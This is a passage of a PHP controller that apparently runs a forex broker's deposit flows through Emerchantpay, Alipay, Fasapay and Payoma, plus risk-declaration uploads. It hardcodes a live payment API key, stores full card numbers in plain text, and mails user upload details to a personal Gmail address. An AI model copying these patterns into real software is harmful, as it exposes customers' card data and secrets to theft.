                $user_information = $this->general_model->whereCondition('user_profiles', ['user_id' => $user_id]);
//                if ($accData = $this->general_model->whereCondition('all_accounts', array('user_id' => $user_id, 'approved' => 1))) {  // only for verify client or partner
                    if ($accData = $this->general_model->whereConditionQuery($user_id)) {  // only for verify client or partner
                        // Loading library for payment process.
                        $this->load->library('emerchantpay');
                        // Define blank arrays.
                        $user = [];
                        $card = [];
                        $bank_details = [];
                        $order = [];
                        // Passing api values.
                        $bank_details['api_key'] = 'm5jP4F72iVnkbdJ7yYCL';
                        // $bank_details['client_id'] = '944724';
                        $bank_details['client_id'] = '944724';

                        // Add card info based on post fields.
                        $card['card_holder_name'] = $this->input->post('card_holder_name', true);
                        $card['card_number'] = $this->input->post('card_number', true);
                        $card['cvv'] = $this->input->post('cardcv2', true);
                        $card['exp_month'] = $this->input->post('card_expiry_month', true);
                        $card['exp_year'] = substr($this->input->post('card_expiry_year', true), 2, 2);

                        // Sending order deatils.
                        $order['order_currency'] = $this->input->post('currency', true);
                        $order['amount'] = number_format($this->input->post('amount', true), 2);
                        $order['order_reference'] = date('Ymdhis').rand(2, 20);
                        $order['notify'] = 0;
                        $order['payment_type'] = 'creditcard';
                        $order['test_transaction'] = '0'; // set 1= test mode and  0 = live
                        $order['auth_type'] = 'sale';  // change to sale, auth etc.

                        $order['item_1_code'] = '1';
                        $order['item_1_qty'] = 1;
                        $order['item_1_predefined'] = 0;
                        $order['item_1_name'] = 'ForexMart Deposit (Emerchantpay - ['.$accData['account_number'].'])';

                        $user['customer_first_name'] = '';
                        $user['customer_last_name'] = $user_information['full_name'];
                        $user['customer_address'] = $user_information['street'];
                        $user['customer_city'] = $user_information['city'];
                        $user['customer_state'] = $user_information['state'];
                        $user['customer_postcode'] = $user_information['country'];
                        $user['customer_country'] = $user_information['country'];
                        $user['customer_phone'] = 'phone';
                        $user['customer_email'] = $this->session->userdata('email');
                        // Getting payment response.
                        $payment_reponse = $this->emerchantpay->paysale($bank_details, $order, $card, $user, '1GBP');

                        if (isset($payment_reponse['order_status']) && $payment_reponse['order_status'] == 'Paid') {
                            if ($payment_reponse['order_total'] == $order['amount']) {
                                $config = [
                                    'server' => 'live_new',
                                ];
                                $WebService = new WebService($config);
                                $account_number = $accData['account_number'];
                                $conv_amount_usd = $this->get_convert_amount($order['order_currency'], $order['amount']);
                                $conv_amount = $this->get_convert_amount(trim($order['order_currency']), $order['amount'], trim($accData['currency']));
                                /* FXPP-6333 */
                                $currencyStatus = $this->currency_status[$order['order_currency']];
                                $isMicro = $this->account_model->isMicro($user_id);
                                if ($isMicro) {
                                    $conv_amount *= 100;
                                    $currencyStatus = $this->currency_status['Cents'];
                                }
                                /* FXPP-6333 */

                                $insertDepositFailed = [
                                    'transaction_id	' => $payment_reponse['order_id'],
                                    'status	' => 0,
                                    'amount	' => $conv_amount,
                                    'currency' => $order['order_currency'],
                                    'user_id' => $accData['user_id'],
                                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                    'transaction_type' => 'EMERCHANTPAY',
                                    'payment_status	' => $this->paymentType_status['Deposit via Emerchantpay'],
                                    'currency_status' => $currencyStatus,
                                    'fee' => 0,
                                    'isFailed' => 0,
                                    'type' => 'deposit-'.$isMicro.'-'.$bonus_type,
                                ];

                                $payment_data = [
                                    'transaction_id' => $payment_reponse['order_id'],
                                    'reference_id' => 0,
                                    'status' => 2,
                                    'amount' => $conv_amount,
                                    'currency' => $order['order_currency'],
                                    'user_id' => $accData['user_id'],
                                    'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                    'note' => $payment_reponse['response'],
                                    'transaction_type' => 'emerchantpay',
                                    'conv_amount' => $conv_amount_usd,
                                    'payment_status	' => $this->paymentType_status['Deposit via Emerchantpay'],
                                    'currency_status' => $currencyStatus,
                                ];

//                                if (IPLoc::APIUpgradeDevIP()) {
                                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['EMERCHANTPAY'].$payment_reponse['order_id']);
                                    $requestResult = $WebServiceNew['requestResult'];
                                    $ticket = $WebServiceNew['ticket'];
//                                } else {
//                                    $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['EMERCHANTPAY'].$payment_reponse['order_id']);
//                                    $requestResult = $WebService->request_status;
//                                    $ticket = $WebService->get_result('Ticket');
//                                }

                                if ($requestResult === 'RET_OK') {
                                    $payment_data['mt_ticket'] = $ticket;

                                    // Back Agent of Client
                                   // FXPP::BackAgentOfAccount($account_number);
                                    $WebService2 = new WebService($config);
                                    $WebService2->request_live_account_balance($account_number);
                                    if ($WebService2->request_status === 'RET_OK') {
                                        $balance = $WebService2->get_result('Balance');
                                        $this->account_model->updateAccountBalance($account_number, $balance);
                                        //FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                                        $card_data = [
                                            'name' => $card['card_holder_name'],
                                            'card_number' => $card['card_number'],
                                            'amount' => $order['amount'],
                                            'cvv' => '', //$card['cvv'],
                                            'card_expiry_date' => '', //$card['exp_month']."/".$card['exp_year'],
                                            'create_date' => date('Y-m-d h:i:s'),
                                            'user_id' => $user_id,
                                            'transaction_id' => $payment_reponse['order_id'],
                                        ];
                                        $this->general_model->insert('emerchantpay', $card_data);
                                        $this->deposit_model->insertPayment($payment_data);

                                        /* ========================================== Welcome bonus================================================ * */

//                                        if ($bonus_type == "tenpb") {
//                                            // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                                            FXPP::DepositBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'tenpb', $payment_data['transaction_id']);
//                                        }

//                                        if ($bonus_type == 'twpb') {
//                                            // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                                            FXPP::DepositBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'twpb', $payment_data['transaction_id']);
//                                        }
//
//                                        if ($bonus_type == 'tpb') {
//                                            // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                                            FXPP::DepositBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'tpb', $payment_data['transaction_id']);
//                                        }
//                                        if ($bonus_type == 'fpb') {
//                                            // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                                            FXPP::DepositBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'fpb', $payment_data['transaction_id']);
//                                        }
//
//                                        if ($bonus_type == 'hpb') {
//                                            // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                                            FXPP::Deposit100PercentBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'hplb', $payment_data['transaction_id']);
//                                        }
//
//                                        if ($bonus_type == 'rhpb') {
//                                            FXPP::DepositRegular100PercentBonus($user_id, $account_number, $conv_amount, 'emerchantpay', 'rhpb', $payment_data['transaction_id'], 10);
//                                            echo $bonus_type.' '.$user_id.' '.$account_number.' '.$conv_amount.' ', $payment_data['transaction_id'];
//                                            exit();
//                                        }

                                        self::applyDepositBonus($user_id, $account_number, $conv_amount, 'emerchantpay', $bonus_type, $payment_data['transaction_id'], false);

                                        $bonuses = FXPP::getAccountBonusByType($account_number);
                                        $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
                                        if ($RequestLogintype['login_type'] != 1) {
                                            if ($conv_amount > 0 and $bonuses[2] > 0) {
                                                FXPP::BonusProfitCancellation($user_id, $account_number, $conv_amount, $payment_data['transaction_id']);
                                            }
                                        }

                                        // Bonus Profit Logs**/
                                        $ndbProfitLogs = [
                                            'Account_number' => $account_number,
                                            'DepAmount' => $conv_amount,
                                            'UserId' => $user_id,
                                            'TransactionId' => $payment_data['transaction_id'],
                                            'ndbbonus' => $bonuses[2],
                                        ];
                                        $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                                        $insertProfitLogs = [
                                            'logs' => $encodeNdbProfitLogs,
                                            'User_Id' => $user_id,
                                        ];
                                        $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                                        $emerpay_cov_amount = $conv_amount;
                                        /**  Use original amount for Cent accounts* */
                                        $isMicro = $this->account_model->isMicro($user_id);
                                        if ($isMicro) {
                                            $emerpay_cov_amount = $conv_amount / 100;
                                        }
                                        /* End * */

                                        $this->session->set_flashdata('msg', 'Transaction is completed');
                                        /* Send successful email deposit to auto-reports * */
                                        $this->sendEmailAfterSuccessDeposit('emerchantpay', $emerpay_cov_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type['EMERCHANTPAY'].$payment_reponse['order_id']);
                                        /** End * */

                                        // transection compleate then set mgs
                                        $mgsData = [
                                            'user_id' => $user_id,
                                            'raw_amount' => $conv_amount,
                                            'transaction_id' => $payment_reponse['order_id'], ];
                                        $this->transactionMessage($mgsData);
                                    } else {
                                        $insertDepositFailed['comment'] = $WebService2->request_status;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                } else {
                                    $insertDepositFailed['comment'] = $requestResult;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }
                            }
                        } else {
                            $data['msg'] = 'Transaction is failed. '.$payment_reponse['errortext'];
                            $email_details = [
                                'account_number' => $accData['account_number'],
                                'type' => 'emerchantpay',
                                'reason' => $payment_reponse['errortext'],
                            ];
                            $this->sendEmailFailedDeposit($email_details);
                        }
                    }
                //}
            }
            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            // $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());
            $status = $this->input->get('status', true);
            $data['status'] = $status;
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }
            //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            $account = $this->general_model->whereConditionQuery($user_id);

            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
            $data['metadata_description'] = 'Provide the necessary information to deposit via HiPay Wallet. Request is processed within 24 hours.';
            $this->template->title('ForexMart | Deposit - HiPay Wallet')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/emerchantpay', $data);
        } else {
            redirect('signout');
        }
    }

    public function hasAccessDeposit()
    {
//         7   => 'BONUS_CONTEST_PRIZE',
//        12   => 'BONUS_CONTEST_MF_PRIZE'

        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
        $bonus_list = [];
        $getAccountBonusByType = FXPP::getAccountBonusByType($account['account_number']);
        foreach ($getAccountBonusByType as $key => $bonuses) {
            array_push($bonus_list, $key);
        }
        if ($this->uri->segment(1) === 'deposit' || $this->uri->segment(1) === 'Deposit') {
            if (in_array(7, $bonus_list) || in_array(12, $bonus_list)) {
                return true;
            } else {
                return false;
            }
        }
    }

    public function alipay_notify()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'alipay'];
        $this->general_model->insertmy('alipay_log', $insertData);
    }

    public function alipayold()
    {
        if (!IPLoc::Office()) {
            redirect('');
        }
        if ($this->session->userdata('logged')) {
            $test_accounts = [
                '69976', //MICRO ACCOUNT TEST LORENZ
                '69966', //NON-MICRO ACCOUNT TEST LORENZ
            ];

            $data['amount'] = $this->input->post_get('amount1', true);

            $data['bounusfiled'] = $this->input->get('bonus', true);
            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
            }
            //if ($data['amount'] == null) {
            $this->form_validation->set_rules('customerNumber', 'Alipay number', 'trim|required|xss_clean');
            $this->form_validation->set_rules('sum', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");
            // }
            //Validation for NDB accounts with Bonus Profit
            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
            if ($hasInNdbBonus == 2) { //has Ndb Bonus
                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation(); //returns false if no open trades
            }

            $data['test'] = '';
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                if (!$data['CurPendValidation']['TradeError'] || $ndb_status) {
                    $number = $this->input->post('customerNumber', true);
                    $amount = $this->input->post('sum', true);

                    /* FXPP-6333
                      $isMicro = $this->account_model->isMicro($getCur['user_id']);
                      if($isMicro){
                      $amount /= 100;
                      }
                      FXPP-6333 */

                    if ($this->input->post('bounusfiled', true) == 'hpb') {
                        $validation = FXPP::Deposit100BonusValidation($this->session->userdata('user_id'), $amount);
                        if ($validation['Error']) {
                            $this->session->set_flashdata('hpb_error', $validation['ErrorMsg']);
                            redirect(FXPP::my_url('deposit/alipay'));
                        }
                    }

                    $this->load->library('Alipay');

                    //  $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                    $account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $this->session->userdata('user_id')));
                    $account_detail = $this->general_model->whereConditionQuery($this->session->userdata('user_id'));

                    $inv = uniqid();
                    $insert_array = [
                        'mobile' => $number,
                        'inv_number' => $inv,
                        'amount' => $amount,
                        'curency' => $account_detail['currency'],
                        'detail' => 'QIWI DEPOSIT',
                        'status' => 0,
                        'user_id' => $this->session->userdata('user_id'),
                        'bouns' => $this->input->post('bounusfiled', true),
                        'create_date' => date('Y-m-d h:i:s'),
                    ];

                    $this->general_model->insert('alipay', $insert_array);

                    $description = 'Alipay deposit';

                    $return_url = 'https://my.forexmart.com/deposit/alipay';
                    $notify_url = 'https://my.forexmart.com/deposit/alipay_notify';
                    $alipay = new Alipay();
                    // Generates a one-time URL to redirect the Buyer to
                    $approve = $alipay->createPayment($inv, $amount, 'USD', $description, $return_url, $notify_url);

                    redirect($approve);
                }
            }

            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            // $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $this->template->title('ForexMart | Deposit - Alipay')
                ->set_layout('internal/main')
                ->prepend_metadata()
                ->build('deposits/alipay', $data);
        } else {
            redirect('signout');
        }
    }

    public function alipay_notifyOld()
    {
        $this->load->library('Alipay');
        $tid = $this->input->post('out_trade_no', true); // $_POST['out_trade_no'];
        $tno = $this->input->post('trade_no', true); //$_POST['trade_no'];
        $total_amount = $this->input->post('total_fee', true); //$_POST['total_fee']; // don't forget to substract Alipay Transaction fee
        $alipay = new Alipay();
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'alipay'];
        $this->general_model->insertmy('alipay_log', $insertData);
        // Verify system transaction ID hasn't been used by looking it up in your DB.

        try {
            if ($alipay->verifyPayment($_POST) === false) { // Transaction isn't complete
                echo 'Unable to verify payment.';

                return false;
            }
        } catch (Exception $e) { // Connection error
            echo $e->getMessage();

            return false;
        } catch (AlipayException $e) { // Hash or invalid transaction error
            echo $e->getMessage();

            return false;
        }
    }

    public function redirect_to_fasapay()
    {
        if (isset($_POST['fp_account']) && isset($_POST['account_number']) && isset($_POST['fp_currency']) && $_POST['fp_amt'] >= 1 && strlen($this->input->post('track_id', true)) > 5 && strlen($this->input->post('track_id', true)) > 5) {
            /* if(IPLoc::Office()){
                $fasapay['link'] = "https://sandbox.fasapay.com/en/sci/";
                $fasapay['fp_acc'] = "FPX3399"; // "FPX5742";

              $fasapay['link'] = "https://sci.fasapay.com/";
               $fasapay['fp_acc'] = "FP292042"; // "FPX5742";

           }else{
               $fasapay['link'] = "https://sci.fasapay.com/";
               $fasapay['fp_acc'] = "FP292042"; // "FPX5742";
           }*/

            $fasapay['link'] = 'https://sandbox.fasapay.com/en/sci/';
            $fasapay['fp_acc'] = 'FPX3399'; // "FPX5742";

            $fasapay['fp_acc_by'] = $this->input->post('fp_account', true);
            $fasapay['fp_acc_from'] = $this->input->post('fp_account', true);
            $fasapay['fp_amnt'] = floatval($this->input->post('fp_amt', true));
            $fasapay['fp_currency'] = $this->input->post('fp_currency', true);
            $fasapay['fp_success_url'] = FXPP::loc_url('deposit/fasapay_success');
            $fasapay['fp_fail_url'] = FXPP::loc_url('deposit/fasapay_fail');
            $fasapay['fp_status_url'] = FXPP::loc_url('deposit/fasapay_status');
            $fasapay['fp_status_form'] = FXPP::loc_url('deposit/fasapay_status_form');
            $fasapay['track_id'] = $this->input->post('track_id', true); //"FP" . date('Ymdhis') . rand(0, 9);
            $fasapay['order_id'] = $this->input->post('order_id', true); //"FP" . date('Ymdhis') . rand(0, 9);
            $fasapay['bonus'] = 0;
            $fasapay['fp_comments'] = $this->input->post('fp_comments', true);
            $fasapay['account_number'] = $this->input->post('account_number', true);

            $insertData = [
                'fp_acc' => $fasapay['fp_acc_by'],
                'fp_amnt' => $fasapay['fp_amnt'],
                'fp_currency' => $fasapay['fp_currency'],
                'fp_comments' => $fasapay['fp_comments'],
                'track_id' => $fasapay['track_id'],
                'order_id' => $fasapay['order_id'],
                'bonus' => 0,
                'create_date' => date('Y-m-d h:i:s'),
                'user_id' => $fasapay['account_number'],
                'type' => 'IFX',
                'fp_success_url' => $this->input->post('fp_success_url', true),
                'fp_status_url' => $this->input->post('fp_status_url', true),
                'fp_fail_url' => $this->input->post('fp_fail_url', true),
            ];

            $this->general_model->insertmy('fasapay', $insertData);
            $this->load->view('deposits/fasapay_payment', $fasapay);
        } else {
            if (isset($_SERVER['HTTP_REFERER'])) {
                redirect($_SERVER['HTTP_REFERER']);
            } elseif (isset($fasapay['fp_fail_url'])) {
                redirect($fasapay['fp_fail_url']);
            } else {
            }
        }
    }

    public function euPaymentStatus($user_id, $type = '')
    {
        $result = [
            'error' => false,
            'error_msg' => '',
        ];
        $eu_payment_status = $this->g_m->showssingle3($table = 'eu_session_payment', 'user_id', $user_id, 'url', $type, '*');
        if ($eu_payment_status['status'] == 1) {
            $result['error'] = true;
            $result['error_msg'] = $eu_payment_status['error_message'];
            $this->g_m->delete2('eu_session_payment', 'user_id', $user_id, 'url', $type);

            return $result;
        } else {
            $this->g_m->delete2('eu_session_payment', 'user_id', $user_id, 'url', $type);

            return $result;
        }
    }

    public function downloadSpanishRiskDecPDF()
    {
        if ($this->session->userdata('logged')) {
            header('Content-type:application/pdf');
            header("Content-Disposition:attachment;filename='Spanish Accept risks declaration.pdf'");
            readfile('./assets/pdf/Spanish Accept risks declaration.pdf');
        }
    }

    public function sendSpanishRiskDecPDFtoClient()
    {
        if ($this->session->userdata('logged')) {
            if (!$this->input->is_ajax_request()) {
                die('Not authorized!');
            }

            $post = $this->input->post();
            $userID = $this->session->userdata('user_id');

            $data['HasError'] = true;

            $allowedActions = [
                'download',
                'email',
            ];

            if (!in_array(strtolower($post['action']), $allowedActions)) {
                echo json_encode($data);
                exit();
            }

            if ($post['action'] == 'email') {
                $subject = 'Spanish Accept risks declaration form';
                $account = $this->user_model->getUserProfileByUserId($userID);

                $config = [
                    'mailtype' => 'html',
                ];

                $data = [
                    'email' => $account['email'],
                    'full_name' => $account['full_name'],
                ];

                $this->general_model->sendEmailAttachment(
                    'spanish-risks-declaration-html',
                    $subject,
                    $data['email'],
                    $data['email'],
                    $data,
                    $config,
                    './assets/pdf/Spanish Accept risks declaration.pdf',
                    'Spanish Accept risks declaration.pdf'
                );
            }

            $tableName = 'spanish_accept_risks_declaration';
            $hasRecord = $this->account_model->getUserRecord($tableName, ['user_id' => $userID]);

            $spanishData = [
                'user_id' => $userID,
                'action' => $post['action'],
                'date' => date('Y-m-d H:m:s'),
            ];

            if ($hasRecord) {
                unset($spanishData['user_id']);
                $result = $this->account_model->updateUserDetails($tableName, 'user_id', $userID, $spanishData);
            } else {
                $result = $this->account_model->insert($tableName, $spanishData);
            }

            if ($result) {
                $data['HasError'] = false;
                echo json_encode($data);
                exit();
            }

            echo json_encode($data);
        }
    }

    public function uploadSpanishDoc()
    {
        if (!$this->input->is_ajax_request()) {
            die('Not authorized!');
        }

        if (IPLoc::PHDevIP()) {
            ini_set('display_errors', 1);
            error_reporting(E_ALL);
        }

        $this->load->helper(['form', 'url', 'file']);

        $data['HasError'] = true;

        if (empty($_FILES['file']['name'])) {
            $data['message'] = 'Please select a file.';
            echo json_encode($data);
            exit();
        }

        $_FILES['userfile']['name'] = $_FILES['file']['name'];
        $_FILES['userfile']['type'] = strtolower($_FILES['file']['type']);
        $_FILES['userfile']['tmp_name'] = $_FILES['file']['tmp_name'];
        $_FILES['userfile']['error'] = $_FILES['file']['error'];
        $_FILES['userfile']['size'] = $_FILES['file']['size'];

        $config['file_name'] = hash('haval192,4', time().$_FILES['userfile']['name']);
        $config['upload_path'] =$this->config->item('asset_user_docs'); //'/var/www/html/my.forexmart.com/assets/user_docs/';
        $config['allowed_types'] = 'pdf';
        $config['max_filename'] = '255';
        $config['max_size'] = '10000';
        $config['overwrite'] = false; // DO NOT CHANGE

        $this->load->library('upload', $config);
        $this->upload->initialize($config);

        try {
            $userID = $_SESSION['user_id'];

            if ($this->upload->do_upload('file')) {
                $upload = $this->upload->data();

                $uploadData = [
                    'uploaded_filename' => $upload['file_name'],
                    'uploaded_date' => date('Y-m-d H:i:s'),
                    'status' => 0, //Pending
                ];

                $this->account_model->updateUserDetails(
                    'spanish_accept_risks_declaration',
                    'user_id',
                    $userID,
                    $uploadData
                );

                $data['message'] = 'Form has been successfully uploaded.';
                $data['HasError'] = false;

                $userDetails = $this->account_model->getUserRecord('mt_accounts_set', ['user_id' => $userID]);
                $uploadData['account_number'] = $userDetails[0]['account_number'];

                $this->load->library('Fx_mailer');
                Fx_mailer::successfulSpanishUpload('finance@forexmart.com', $_SESSION['email'], $uploadData);
                Fx_mailer::successfulSpanishUpload('fxppversion11111@gmail.com', $_SESSION['email'], $uploadData);
            } else {
                $data['message'] = $this->upload->display_errors();
            }
        } catch (Exception $e) {
            if (strpos($e->getMessage(), 'pdf') !== false) {
                $data['message'] = 'The PDF file type that you uploaded is not supported.';
            } else {
                $data['message'] = $e->getMessage();
            }
        }

        echo json_encode($data, JSON_PRETTY_PRINT);
    }

    public function spanishValidation($user_id)
    {
        $data = [
            'spanish_client' => true,
            'message' => 'Spanish client',
        ];

        $tableName = 'spanish_accept_risks_declaration';
        $hasRecord = $this->account_model->getUserRecord($tableName, ['user_id' => $user_id]);

        if ($hasRecord) {
            switch ($hasRecord[0]['status']) {
                case null:
                case 2:
                    return $data;
                    break;
                case 0:
                    $data['message'] = 'Your form has been successfully sent to our review team. We will get back to you as soon as possible.';

                    return $data;
                    break;
            }
        } else {
            // $getRegisteredIP = $this->account_model->getUserRecord('mt_accounts_set', array("user_id" => $user_id));
            //  $countryCode = IPLoc::getCountryCodeFromIP($getRegisteredIP[0]['registration_ip']);
            $account = $this->account_model->getAccountsCountry($user_id);

            if ($account[0]['country'] == 'ES') {
                return $data;
            }

//            if (strtoupper($countryCode) == "ES") {
//                return $data;
//            }
//
//            $IPLoc = new IPLoc();
//            $countryCodeCatch = $IPLoc->getCountryCodeFromNetIP($getRegisteredIP[0]['registration_ip']);
//
//            if (strtoupper($countryCodeCatch) == "ES") {
//                return $data;
//            }
        }

        $data['spanish_client'] = false;

        return $data;
    }

    public function isArabicCountry($user_id)
    {
        $getRegisteredIP = $this->account_model->getUserRecord('mt_accounts_set', ['user_id' => $user_id]);
        $countryCode = IPLoc::getCountryCodeFromIP($getRegisteredIP[0]['registration_ip']);

        if (FXPP::isArabicCountry(strtoupper($countryCode), 'code')) {
            return true;
        }

        $IPLoc = new IPLoc();
        $countryCodeCatch = $IPLoc->getCountryCodeFromNetIP($getRegisteredIP[0]['registration_ip']);

        if (FXPP::isArabicCountry(strtoupper($countryCodeCatch), 'code')) {
            return true;
        }

        return false;
    }

    public function payomatest()
    {
        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();
            exit();
            $user_id = $this->session->userdata('user_id');
            $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
            $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
            $order_id = $this->session->userdata('user_id').time();

            $data = [
                        'amount' => 1.8,
                        'order_id' => $order_id,
                        'account_number' => $this->session->userdata('account_number'),
                        'country' => $profile['country'],
                        'city' => $profile['city'],
                        'name' => $profile['full_name'],
                        'email' => $this->session->userdata('email'),
                        'regdate' => date('y-m-d', $user['created']),
                    ];

            $insertData = [
                        'account_number' => $data['account_number'],
                        'amount' => $data['amount'],
                        'order_id' => $data['order_id'],
                        'bonus' => $this->input->get('bonus'),
                        'user_id' => $this->session->userdata('user_id'),
                    ];
            print_r($insertData);
            $this->general_model->insert('payoma', $insertData);

            $this->payomaDepositProcesstest($data);
        } else {
            redirect('signout');
        }
    }

    private function payomaDepositProcesstest($orderXMLObj)
    {
        exit();
        $status = 'success';
        $sum = $orderXMLObj['amount'];
        $currency = 'USD';
        if ($status == 'success') {
            if ($row = $this->general_model->where('payoma', ['order_id' => $orderXMLObj['order_id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($sum)) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $sum;
                    $total_amount = $this->get_convert_amount($currency, $amount, $accData['currency']);
                    // $currency = $orderXMLObj->currency;

                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $fee = (($amount * 3.5) / 100) + 0.50; // Fee (3.5%)+ fixed feed(0.50$)
                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($currency, $bonus);
                    $amount -= $fee;

                    $conv_amount = $this->get_convert_amount($currency, $amount, $accData['currency']);
                    $conv_amount_fee = $this->get_convert_amount($currency, $fee, $accData['currency']);
                    $conv_amount_bonus = $this->get_convert_amount($currency, $bonus, $accData['currency']);
                    $conv_amount_usd = $this->get_convert_amount($currency, $amount);

                    $insertDepositFailed = [
                        'transaction_id' => '01234567890',
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'PAYOMA',
                        'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => '01234567890',
                        'reference_id' => $orderXMLObj['order_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Payoma deposit',
                        'transaction_type' => 'PAYOMA',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => '01234567890',
                            'reference_id' => $orderXMLObj['order_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'Payoma deposit',
                            'transaction_type' => 'PAYOMA',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via Payoma'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$data['transaction_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$data['transaction_id']);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
